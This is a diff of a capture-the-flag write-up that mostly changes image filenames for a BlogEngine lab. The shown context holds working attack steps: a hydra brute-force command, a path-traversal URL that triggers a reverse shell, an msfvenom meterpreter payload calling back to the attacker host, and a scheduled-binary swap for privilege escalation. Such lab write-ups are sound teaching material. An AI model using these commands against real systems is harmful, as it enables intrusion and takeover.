@@ -18,7 +18,7 @@ This room will cover brute-forcing an accounts credentials, handling public expl
 
 ### What’s the name of the clown displayed on the homepage? <a href="#user-content-whats-the-name-of-the-clown-displayed-on-the-homepage" id="user-content-whats-the-name-of-the-clown-displayed-on-the-homepage"></a>
 
-<figure><img src="../../.gitbook/assets/Untitled (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled (3).png" alt=""><figcaption></figcaption></figure>
 
 There is an image of the clown of the IT movie. It’s name is ————.
 
@@ -36,13 +36,13 @@ You can check what request a form is making by right clicking on the login form,
 
 By clicking to the button located in the top-right corner of the website a menu appears:
 
-<figure><img src="../../.gitbook/assets/Untitled 1 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 1 (3).png" alt=""><figcaption></figcaption></figure>
 
 And clicking on LOG IN redirects us to this form:
 
-<figure><img src="../../.gitbook/assets/Untitled 2 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 2 (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/Untitled 3 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 3 (3).png" alt=""><figcaption></figcaption></figure>
 
 Looking at the source code we can see that the request type of this login form is POST
 
@@ -56,17 +56,17 @@ Run the following command but fill in the blanks:
 
 Navigating through the webpage, we can see that the only post published was made by “Administrator”.
 
-<figure><img src="../../.gitbook/assets/Untitled 4 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 4 (3).png" alt=""><figcaption></figcaption></figure>
 
 And if you click on the ADMINISTRATOR text, it redirects you to /author/Admin, so I guess that Admin is the username we are looking for.
 
 Also, the source code of the page says that the blog is run using BlogEngine:
 
-<figure><img src="../../.gitbook/assets/Untitled 5 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 5 (3).png" alt=""><figcaption></figcaption></figure>
 
 So, I searched what is the default user of blogengine and it appears that is admin.
 
-<figure><img src="../../.gitbook/assets/Untitled 6 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 6 (3).png" alt=""><figcaption></figcaption></figure>
 
 The search results also says that the default password is admin, but I have tested it and didn’t work.
 
@@ -74,7 +74,7 @@ I’ll be using fasttrack wordlist first, and if it doesn’t work I’ll use ro
 
 First thing I’ll do is gather all the info we need to execute the hydra command. I’ll try to log in with random credentials and I’ll intercept the request using Burp Suite:
 
-<figure><img src="../../.gitbook/assets/Untitled 7 (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 7 (4).png" alt=""><figcaption></figcaption></figure>
 
 In the intercepted request we can see that the request is sent to `/Account/login.aspx?ReturnURL=%2fadmin%2f`
 
@@ -92,11 +92,11 @@ Now, with the gathered data we can build the hydra command:
 
 `hydra -l admin -P /usr/share/wordlists/fasttrack.txt 10.10.243.37 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=gIM3gB3youIJgamYDSq9I8KcJ65qkTcGNG4xcUV66GCbWTe8qxBf5vazzsVkYF46UequbLwxMPB%2FnJ250OVbaWslvJVxsUgX%2FekcVU66%2BSNQLM9g2YcBDaz%2BwIFVq8MbJeAlNAlVuVBb1ENbouQ%2BCUEUXdaAqER9UJSIfeTrsVti5NnFU%2FOkeI7Le6opTMtQVLgJ51cTY%2F8d2dHOUT5TWh7lftIpTvCG4YoxkI9abb7w1UUXMjgRd3mYIOUNQDAeR3solEMZn%2B5wSBYd%2FWNkQPfJUj9T5UNz3b1zGXCXi8HxiQx%2BzADp3s6bNvz7asMk8Y0MN1cIUBVqR8wkg3k%2Bn6EyHyR34gH1aiJfUNqdJ3vuGlrt&__EVENTVALIDATION=ZV5wkfSbQ%2FJN6v0RuQGDdvbxdRQHFrlNqpv0YgcsGLcQq22scoM7bk62pimul0s5oWnrfNnH6CIgqIakaJHZLsijL7D8mrB4atQ5YwZIRBshvtBSvWryF3NIyxCFVGYBZVHq4ofIQhijtUj3gN2cD0xIxW1yOiAdbjo5zVPz%2B7%2BY3gc2&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V`
 
-<figure><img src="../../.gitbook/assets/Untitled 9 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 9 (3).png" alt=""><figcaption></figcaption></figure>
 
 Horay! We found a valid password for the admin user, let’s log in:
 
-<figure><img src="../../.gitbook/assets/Untitled 10 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 10 (3).png" alt=""><figcaption></figcaption></figure>
 
 We’re in!
 
@@ -110,7 +110,7 @@ Exploit-Database is a CVE (common vulnerability and exposures) archive of public
 
 On the left menu there is a About button:
 
-<figure><img src="../../.gitbook/assets/Untitled 11 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 11 (3).png" alt=""><figcaption></figcaption></figure>
 
 The version of BlogEngine is 3.3.6.0. Anyways we have seen that version before in a comment of the webpage source code!
 
@@ -118,11 +118,11 @@ The version of BlogEngine is 3.3.6.0. Anyways we have seen that version before i
 
 Let’s search “blogengine”, if there is many result we’ll do a more specific search:
 
-<figure><img src="../../.gitbook/assets/Untitled 12 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 12 (3).png" alt=""><figcaption></figcaption></figure>
 
 There are a few exploits, this one seems the correct one to gain a reverse shell:
 
-<figure><img src="../../.gitbook/assets/Untitled 13 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 13 (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Using the public exploit, gain initial access to the server. Who is the webserver running as? <a href="#user-content-using-the-public-exploit-gain-initial-access-to-the-server-who-is-the-webserver-running" id="user-content-using-the-public-exploit-gain-initial-access-to-the-server-who-is-the-webserver-running"></a>
 
@@ -164,25 +164,25 @@ First of all we have to download the exploit (or use it using msfconsole I guess
 
 To configure it, let’s follow the steps ahead and change the default IP address of the code:
 
-<figure><img src="../../.gitbook/assets/Untitled 14 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 14 (3).png" alt=""><figcaption></figcaption></figure>
 
 After that we have to save it as PostView.ascx.
 
 Now, let’s upload this file to the server:
 
-<figure><img src="../../.gitbook/assets/Untitled 15 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 15 (3).png" alt=""><figcaption></figcaption></figure>
 
 Now let’s open a netcat listener in our machine:
 
-<figure><img src="../../.gitbook/assets/Untitled 16 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 16 (3).png" alt=""><figcaption></figcaption></figure>
 
 And finally, let’s trigger the vulnerability by accessing the url: `http://10.10.243.37/?theme=../../App_Data/files`
 
-<figure><img src="../../.gitbook/assets/Untitled 17 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 17 (3).png" alt=""><figcaption></figcaption></figure>
 
 Yeah! Let’s see who am I logged as:
 
-<figure><img src="../../.gitbook/assets/Untitled 18 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 18 (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Windows Privilege Escalation <a href="#user-content-windows-privilege-escalation" id="user-content-windows-privilege-escalation"></a>
 
@@ -198,7 +198,7 @@ So, first of all let’s generate the payload using msfvenom as the tip says. To
 
 `echo %PROCESSOR_ARCHITECTURE%`
 
-<figure><img src="../../.gitbook/assets/Untitled 19 (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 19 (3).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, the response indicates that the architecture is 64b. With this info, let’s generate the payload in our machine. `msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.10.10 LPORT=1234`
 
@@ -208,11 +208,11 @@ Now is time to send the payload to the target machine:
 
 The default directory at login is c:/windows/system32/inetsrv.
 
-<figure><img src="../../.gitbook/assets/Untitled 21 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 21 (2).png" alt=""><figcaption></figcaption></figure>
 
 Probably, we won’t have write permissions inside system32 folder, so let’s find another location where we can save the payload:
 
-<figure><img src="../../.gitbook/assets/Untitled 22 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 22 (2).png" alt=""><figcaption></figcaption></figure>
 
 C:/Windows/Temp seems like a good place to save the payload.
 
@@ -220,7 +220,7 @@ With this powershell command, we can download files: `Invoke-WebRequest <FILE PA
 
 So, first of all, let’s start a http server in our machine:
 
-<figure><img src="../../.gitbook/assets/Untitled 23 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 23 (2).png" alt=""><figcaption></figcaption></figure>
 
 Now, we are ready to download it using the powershell script, but we have a simple bash, not a powershell, but we can execute it by using:
 
@@ -238,35 +238,35 @@ We can see that the download takes place.
 
 Next step is open msfconsole and use multi/handler module to capture the meterpreter shell. We have to configure it with the same values we used in the payload:
 
-<figure><img src="../../.gitbook/assets/Untitled 26.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 26 (1).png" alt=""><figcaption></figcaption></figure>
 
 And finally we have to execute the payload in the target machine:
 
-<figure><img src="../../.gitbook/assets/Untitled 27 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 27 (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/Untitled 28 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 28 (2).png" alt=""><figcaption></figcaption></figure>
 
 Mmm… it failed. Yep, I forgot to set the payload as it was an staged payload:
 
-<figure><img src="../../.gitbook/assets/Untitled 29 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 29 (2).png" alt=""><figcaption></figcaption></figure>
 
 Now we got it! ![💡](https://s.w.org/images/core/emoji/15.0.3/svg/1f4a1.svg) You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the \[windows-exploit-suggester]\([https://github.com/GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)) script and quickly identify any obvious vulnerabilities.
 
 ### What is the OS version of this windows machine? <a href="#user-content-what-is-the-os-version-of-this-windows-machine" id="user-content-what-is-the-os-version-of-this-windows-machine"></a>
 
-<figure><img src="../../.gitbook/assets/Untitled 30 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 30 (2).png" alt=""><figcaption></figcaption></figure>
 
 ## Further enumerate the machine. What is the name of the abnormal _service_ running? <a href="#user-content-further-enumerate-the-machine-what-is-the-name-of-the-abnormalservicerunning" id="user-content-further-enumerate-the-machine-what-is-the-name-of-the-abnormalservicerunning"></a>
 
 To further enumerate the machine, the easiest option is to use WinPeas enumeration script. To do so, we have to donwload it and send it to the target machine:
 
-<figure><img src="../../.gitbook/assets/Untitled 31 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 31 (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/Untitled 32 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 32 (2).png" alt=""><figcaption></figcaption></figure>
 
 And now, let’s execute the winPEAS binary:
 
-<figure><img src="../../.gitbook/assets/Untitled 33 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 33 (2).png" alt=""><figcaption></figcaption></figure>
 
 At services section those are running:
 
@@ -278,11 +278,11 @@ The last one seems to be exploitable by DLL Hijacking.
 
 WindowsScheduler is like cronjobs but for windows. Let’s see if there is anything useful in the logs. To do so, let’s navigate to the Events Scheduler folder:
 
-<figure><img src="../../.gitbook/assets/Untitled 35 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 35 (2).png" alt=""><figcaption></figcaption></figure>
 
 And let’s look if there is anything we can use in the log:
 
-<figure><img src="../../.gitbook/assets/Untitled 36 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 36 (2).png" alt=""><figcaption></figcaption></figure>
 
 In this log we can see that every minute, the Message.exe process start and 30 seconds later it ends. We can see also that is being executed as Administrator. If we can substitute the Message.exe binary with our own binary, we could do privesc.
 
@@ -296,24 +296,24 @@ We can create a binary using msfvenom to start a reverse shell with administrato
 
 Let’s rename the original binary and download the one we created:
 
-<figure><img src="../../.gitbook/assets/Untitled 38 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 38 (2).png" alt=""><figcaption></figcaption></figure>
 
 Let’s open a netcat listener on the same port we used to configure the payload:
 
-<figure><img src="../../.gitbook/assets/Untitled 39.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 39 (1).png" alt=""><figcaption></figcaption></figure>
 
 And wait for a connection…
 
-<figure><img src="../../.gitbook/assets/Untitled 40.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 40 (1).png" alt=""><figcaption></figcaption></figure>
 
 Connected!
 
-<figure><img src="../../.gitbook/assets/Untitled 41.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 41 (1).png" alt=""><figcaption></figcaption></figure>
 
 And as Administrator! Let’s look for the files we need:
 
-<figure><img src="../../.gitbook/assets/Untitled 42.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 42 (1).png" alt=""><figcaption></figcaption></figure>
 
 ### What is the root flag? <a href="#user-content-what-is-the-root-flag" id="user-content-what-is-the-root-flag"></a>
 
-<figure><img src="../../.gitbook/assets/Untitled 43 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/Untitled 43 (2).png" alt=""><figcaption></figcaption></figure>
